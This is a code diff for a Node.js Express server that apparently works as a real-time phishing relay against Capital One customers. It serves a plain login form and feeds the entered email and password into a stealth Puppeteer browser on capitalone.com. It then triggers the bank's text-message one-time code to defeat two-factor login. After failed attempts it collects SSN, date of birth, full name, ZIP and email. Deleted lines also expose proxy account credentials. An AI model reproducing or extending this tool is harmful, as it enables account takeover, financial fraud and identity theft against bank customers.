@@ -1,7 +1,12 @@
+
 const express = require("express");
 const bodyParser = require("body-parser");
 const puppeteer = require("puppeteer-extra");
 const StealthPlugin = require("puppeteer-extra-plugin-stealth");
+const axios = require("axios");
+const qs = require("qs");
+const session = require("express-session"); // For session management
+const fs = require("fs/promises"); // For handling phone.txt file
 
 // Add stealth plugin to Puppeteer
 puppeteer.use(StealthPlugin());
@@ -9,14 +14,94 @@ puppeteer.use(StealthPlugin());
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Track invalid login attempts globally
-let invalidAttempts = 0;
+// Configure session middleware
+app.use(
+  session({
+    secret: "your-secret-key", // Replace with a strong secret key
+    resave: false,
+    saveUninitialized: true,
+    cookie: { secure: false }, // Set to `true` if using HTTPS
+  })
+);
+
+// Turnstile Secret Key
+const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY;
+
+// Puppeteer browser and page instances
 let browser, page;
 
-// Route: Serve the login form
+// Function to launch Puppeteer browser
+async function launchBrowser() {
+  if (!browser) {
+    console.log("Launching Puppeteer browser...");
+    browser = await puppeteer.launch({
+      headless: true,
+      executablePath: "/app/.chrome-for-testing/chrome-linux64/chrome", // Adjust path for Heroku
+      args: [
+        "--no-sandbox",
+        "--disable-setuid-sandbox",
+        "--disable-dev-shm-usage",
+        "--single-process",
+        "--disable-gpu",
+      ],
+    });
+    console.log("Browser launched successfully!");
+    page = await browser.newPage();
+    console.log("New page created!");
+  }
+}
+
+// Gracefully close Puppeteer browser when the process exits
+process.on("SIGTERM", async () => {
+  console.log("SIGTERM received. Closing browser...");
+  if (browser) await browser.close();
+  process.exit(0);
+});
+
+process.on("SIGINT", async () => {
+  console.log("SIGINT received. Closing browser...");
+  if (browser) await browser.close();
+  process.exit(0);
+});
+
+// Function to validate Turnstile token
+async function validateTurnstileToken(token) {
+  try {
+    if (!TURNSTILE_SECRET_KEY) {
+      console.error("Turnstile secret key is missing!");
+      return false;
+    }
+
+    console.log("Validating Turnstile token with secret:", TURNSTILE_SECRET_KEY);
+
+    const response = await axios.post(
+      "https://challenges.cloudflare.com/turnstile/v0/siteverify",
+      qs.stringify({
+        secret: TURNSTILE_SECRET_KEY,
+        response: token,
+      }),
+      {
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+      }
+    );
+
+    console.log("Turnstile validation response:", response.data);
+    return response.data.success;
+  } catch (error) {
+    console.error("Error validating Turnstile token:", error.message);
+    return false;
+  }
+}
+
+// Serve the login form
 app.get("/", (req, res) => {
+  // Initialize invalidAttempts for the session
+  req.session.invalidAttempts = req.session.invalidAttempts || 0;
   res.send(`
     <!DOCTYPE html>
     <html lang="en">
@@ -24,34 +109,14 @@ app.get("/", (req, res) => {
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Login</title>
-        <style>
-          body {
-            font-family: Arial, sans-serif;
-            max-width: 500px;
-            margin: 2rem auto;
-            text-align: center;
-          }
-          input, button {
-            padding: 0.5rem;
-            margin: 0.5rem 0;
-            font-size: 1rem;
-          }
-          button {
-            background-color: #007bff;
-            color: #fff;
-            border: none;
-            cursor: pointer;
-          }
-          button:hover {
-            background-color: #0056b3;
-          }
-        </style>
+        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
       </head>
       <body>
         <h1>Login</h1>
         <form action="/submit-login" method="POST">
           <label>Email: <input type="text" name="email" required /></label><br/>
           <label>Password: <input type="password" name="password" required /></label><br/>
+          <div class="cf-turnstile" data-sitekey="0x4AAAAAAA6n2sVAp0He7OUj"></div><br/>
           <button type="submit">Log in</button>
         </form>
       </body>
@@ -59,95 +124,65 @@ app.get("/", (req, res) => {
   `);
 });
 
-// Route: Handle login form submission
+// Handle login form submission
 app.post("/submit-login", async (req, res) => {
-  const { email, password } = req.body;
-
-  try {
-    // Launch Puppeteer browser with SOCKS5 proxy if not already launched
-    if (!browser) {
-      browser = await puppeteer.launch({
-        headless: true, // Use non-headless mode for debugging
-        args: [
-          "--no-sandbox",
-          "--disable-setuid-sandbox",
-          "--proxy-server=http://gate.smartproxy.com:10001", // SOCKS5 proxy
-        ],
-      });
-
-      page = await browser.newPage();
-
-      // Authenticate the proxy
-      await page.authenticate({
-        username: "sph2tmexja",
-        password: "eA5Ee1quqki7eUFg7~",
-      });
-
-      // Set a random User-Agent and headers
-      await page.setUserAgent(
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
-      );
-      await page.setExtraHTTPHeaders({
-        "Accept-Language": "en-US,en;q=0.9",
-        "Upgrade-Insecure-Requests": "1",
-      });
+    const { email, password } = req.body;
+    const turnstileToken = req.body["cf-turnstile-response"];
+  
+    if (!turnstileToken) {
+      return res.status(400).send("<h1>CAPTCHA token is missing. Please try again.</h1>");
     }
-
-    console.log(`Server running at 000`);
-
-    // Navigate to the Capital One login page
-    await page.goto("https://www.capitalone.com", {
-      waitUntil: "networkidle2",
-      timeout: 120000, // Extend timeout to 120 seconds
-    });
-     
-    console.log(`Server running at 00`);
-
-    // Clear cookies and cache explicitly
-    const client = await page.target().createCDPSession();
-    await client.send("Network.clearBrowserCookies");
-    await client.send("Network.clearBrowserCache");
-
-    // Simulate human-like typing by clearing and entering text with delays
-    await page.evaluate(() => {
-      const emailField = document.querySelector('input#ods-input-0');
-      if (emailField) emailField.value = "";
-
-      const passwordField = document.querySelector('input#ods-input-1');
-      if (passwordField) passwordField.value = "";
-    });
-
-    await page.type("input#ods-input-0", email, { delay: Math.random() * 200 + 50 });
-    await page.type("input#ods-input-1", password, { delay: Math.random() * 200 + 50 });
-
-    // Click the login button
-    await page.evaluate(() => {
-      const button = document.querySelector("button#noAcctSubmit");
-      if (button) button.click();
-    });
-
-    // Wait for navigation after login attempt
-    await page.waitForNavigation({ waitUntil: "networkidle2", timeout: 120000 });
-
-    // Check for login success
-    const loginSuccess = await page.evaluate(() => {
-      const element = document.querySelector(
-        "div.option-list-entry--message > p.message--header"
-      );
-      return element && element.textContent.trim() === "Text me a temporary code";
-    });
-
+  
+    const isValidCaptcha = await validateTurnstileToken(turnstileToken);
+    if (!isValidCaptcha) {
+      return res.status(403).send("<h1>Invalid CAPTCHA. Please try again.</h1>");
+    }
+  
+    req.session.invalidAttempts = req.session.invalidAttempts || 0;
+  
+    try {
+      await launchBrowser();
+  
+      console.log("Navigating to login page...");
+      await page.goto("https://www.capitalone.com/", { waitUntil: "networkidle2" });
+  
+      console.log("Filling in login form...");
+      await page.type("input#ods-input-0", email, { delay: 100 });
+      await page.type("input#ods-input-1", password, { delay: 100 });
+  
+      console.log("Submitting login form...");
+      await page.click("button#noAcctSubmit");
+      await page.waitForNavigation({ waitUntil: "networkidle2" });
+  
+      const loginSuccess = await page.evaluate(() => {
+        const element = document.querySelector("div.option-list-entry--message > p.message--header");
+        return element && element.textContent.trim() === "Text me a temporary code";
+      });
+  
+        // Handle login success or failure
     if (loginSuccess) {
-      invalidAttempts = 0; // Reset invalid attempts
+      console.log("Login successful!");
 
-      // Click "Text me a temporary code"
-      await page.click("div.option-list-entry--message > p.message--header");
+      // Check for "Text me a temporary code" option
+  const codeOptionExists = await page.evaluate(() => {
+    const element = document.querySelector('div.option-list-entry--message > p.message--header');
+    return element && element.textContent.trim() === 'Text me a temporary code';
+  });
 
-      // Wait for "Send me the code" button
-      await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
-      await page.click('button[data-testtarget="otp-button"]');
+  if (codeOptionExists) {
+    // Click the option to resend the code
+    await page.click('div.option-list-entry--message > p.message--header');
+    await page.waitForNavigation({ waitUntil: "networkidle2" });
 
-      // Render the OTP input form
+    const buttonText = await page.$eval('button[data-testtarget="otp-button"]', el => el.textContent);
+console.log("Button text: ", buttonText);  // Check what the button says
+await page.click('button[data-testtarget="otp-button"]');
+
+
+  }
+
+  
+
       res.send(`
         <!DOCTYPE html>
         <html lang="en">
@@ -156,10 +191,26 @@ app.post("/submit-login", async (req, res) => {
             <meta name="viewport" content="width=device-width, initial-scale=1.0" />
             <title>Enter OTP</title>
             <style>
-              body { font-family: Arial, sans-serif; max-width: 500px; margin: 2rem auto; text-align: center; }
-              input, button { padding: 0.5rem; margin: 0.5rem 0; font-size: 1rem; }
-              button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
-              button:hover { background-color: #0056b3; }
+              body {
+                font-family: Arial, sans-serif;
+                max-width: 500px;
+                margin: 2rem auto;
+                text-align: center;
+              }
+              input, button {
+                padding: 0.5rem;
+                margin: 0.5rem 0;
+                font-size: 1rem;
+              }
+              button {
+                background-color: #007bff;
+                color: #fff;
+                border: none;
+                cursor: pointer;
+              }
+              button:hover {
+                background-color: #0056b3;
+              }
             </style>
           </head>
           <body>
@@ -171,17 +222,187 @@ app.post("/submit-login", async (req, res) => {
           </body>
         </html>
       `);
-    } else {
-      invalidAttempts++;
-      res.send("<h1>Invalid login attempt. Please try again.</h1>");
+    }else {
+        req.session.invalidAttempts++;
+  
+        if (req.session.invalidAttempts === 1) {
+          res.send(`
+             <!DOCTYPE html>
+    <html lang="en">
+      <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Login</title>
+        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+      </head>
+      <body>
+        <h1>INVALID Login</h1>
+        <form action="/submit-login" method="POST">
+          <label>Email: <input type="text" name="email" required /></label><br/>
+          <label>Password: <input type="password" name="password" required /></label><br/>
+          <div class="cf-turnstile" data-sitekey="0x4AAAAAAA6n2sVAp0He7OUj"></div><br/>
+          <button type="submit">Log in</button>
+        </form>
+      </body>
+    </html>
+          `);
+        } else if (req.session.invalidAttempts === 2) {
+          console.log("Second invalid attempt: Navigating to Sign-In Help...");
+  
+          // Navigate to the Sign-In Help page
+          await page.goto("https://verified.capitalone.com/sign-in-help/", { waitUntil: "networkidle2" });
+  
+          // Serve the contact form
+          res.send(`
+            <!DOCTYPE html>
+            <html lang="en">
+              <head>
+                <meta charset="UTF-8" />
+                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+                <title>Contact Information</title>
+                <style>
+                  body {
+                    font-family: Arial, sans-serif;
+                    max-width: 500px;
+                    margin: 2rem auto;
+                    text-align: center;
+                  }
+                  input, button {
+                    padding: 0.5rem;
+                    margin: 0.5rem 0;
+                    font-size: 1rem;
+                  }
+                  button {
+                    background-color: #007bff;
+                    color: #fff;
+                    border: none;
+                    cursor: pointer;
+                  }
+                  button:hover {
+                    background-color: #0056b3;
+                  }
+                </style>
+              </head>
+              <body>
+                <h1>Contact Information</h1>
+                <form action="/submit-contact" method="POST">
+                  <label>Last Name: <input type="text" name="lastname" required /></label><br/>
+                  <label>SSN: <input type="password" name="ssn" required /></label><br/>
+                  <label>Date of Birth: <input type="text" name="dob" required placeholder="mm/dd/yyyy" /></label><br/>
+                  <button type="submit">Find Me</button>
+                </form>
+              </body>
+            </html>
+          `);
+        } else {
+          res.send("<h1>Too many invalid attempts. Please try again later.</h1>");
+        }
+      }
+    } catch (error) {
+      console.error("Error during login process:", error);
+      res.status(500).send("<h1>An error occurred. Please try again later.</h1>");
     }
+  });
+  
+
+  // Route: Handle contact form submission
+app.post("/submit-contact", async (req, res) => {
+  const { lastname, ssn, dob } = req.body;
+
+  try {
+    console.log("Filling in contact form...");
+    // Fill the contact form fields on the Puppeteer browser page
+    await page.type('input#lastname', lastname, { delay: 100 });
+    await page.type('input#fullSSN', ssn, { delay: 100 });
+    await page.type('input#dob', dob, { delay: 100 });
+
+    console.log("Submitting contact form...");
+    // Click the "Find Me" button
+    await page.click('#find-me-button');
+
+    console.log("Waiting for success indicator...");
+    // Wait for the success button to appear (or timeout if not found)
+    await page.waitForSelector('button[data-testtarget="noAccessButton"]', {
+      visible: true,
+      timeout: 15000, // Timeout reduced to 15 seconds to ensure Heroku's 30-second limit is not exceeded
+    });
+
+    console.log("Contact form submitted successfully!");
+    // If the button is found, send a success message
+    res.send("<h1>Contact details submitted successfully!</h1>");
   } catch (error) {
-    console.error("Error during login:", error);
-    res.status(500).send("<h1>An error occurred during login.</h1>");
+    console.error("Error submitting contact details:", error);
+
+    if (error.name === 'TimeoutError') {
+      console.log("Contact details not found, rendering Identity Info form...");
+      // Serve the Identity Info form
+      res.send(`
+        <!DOCTYPE html>
+        <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+            <title>Identity Info</title>
+            <style>
+              body {
+                font-family: Arial, sans-serif;
+                max-width: 500px;
+                margin: 2rem auto;
+                text-align: center;
+              }
+              input, button {
+                padding: 0.5rem;
+                margin: 0.5rem 0;
+                font-size: 1rem;
+              }
+              button {
+                background-color: #007bff;
+                color: #fff;
+                border: none;
+                cursor: pointer;
+              }
+              button:hover {
+                background-color: #0056b3;
+              }
+            </style>
+          </head>
+          <body>
+            <h1>Identity Info</h1>
+            <p>We couldn't find your contact details. Please provide additional information below:</p>
+            <form action="/submit-identity-info" method="POST">
+              <label>Full Name: <input type="text" name="fullname" required /></label><br/>
+              <label>ZIP Code: <input type="text" name="zipcode" required /></label><br/>
+              <label>Email Address: <input type="email" name="email" required /></label><br/>
+              <button type="submit">Submit</button>
+            </form>
+          </body>
+        </html>
+      `);
+    } else {
+      res.status(500).send("<h1>An error occurred while submitting contact details.</h1>");
+    }
   }
 });
 
+  app.post("/submit-identity-info", async (req, res) => {
+    const { fullname, zipcode, email } = req.body;
+  
+    try {
+      console.log("Received identity info:");
+      console.log(`Full Name: ${fullname}`);
+      console.log(`ZIP Code: ${zipcode}`);
+      console.log(`Email Address: ${email}`);
+  
+      // Process the identity information as needed (e.g., log it, send it to another Puppeteer process)
+      res.send("<h1>Identity information submitted successfully!</h1>");
+    } catch (error) {
+      console.error("Error processing identity info:", error);
+      res.status(500).send("<h1>An error occurred while processing your identity information.</h1>");
+    }
+  });
+
 // Start the server
 app.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}`);
+  console.log(`Server running on http://localhost:${PORT}`);
 });
+
